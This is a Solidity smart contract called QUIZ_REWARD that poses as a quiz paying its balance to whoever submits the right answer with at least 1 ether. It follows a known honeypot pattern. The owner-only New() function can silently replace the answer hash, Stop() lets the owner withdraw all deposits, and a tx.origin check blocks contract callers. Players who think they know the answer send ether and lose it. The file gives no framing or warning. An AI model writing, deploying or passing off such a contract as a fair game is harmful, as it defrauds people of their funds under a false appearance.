1 pragma solidity ^0.4.25;
2 
3 contract QUIZ_REWARD
4 {
5     string public Q;
6     address questionSender;
7     bytes32 responseHash;
8 
9     function() public payable{}
10 
11     function PlayQuiz(string resp) public payable {
12         require(msg.sender == tx.origin);
13         if (responseHash == keccak256(resp) && msg.value >= 1 ether) {
14             msg.sender.transfer(address(this).balance);
15         }
16     }
17 
18     function Config(string q, string resp) public payable {
19         if (responseHash == 0x0) {
20             responseHash = keccak256(resp);
21             Q = q;
22             questionSender = msg.sender;
23         }
24     }
25     
26     function Stop() public payable {
27        require(msg.sender == questionSender);
28        msg.sender.transfer(address(this).balance);
29     }
30     
31     function New(string q, bytes32 respHash) public payable {
32         require(msg.sender == questionSender);
33         Q = q;
34         responseHash = respHash;
35     }
36     
37     function Sender(address a) {
38         require(msg.sender == questionSender);
39         questionSender = a;
40     }
41 }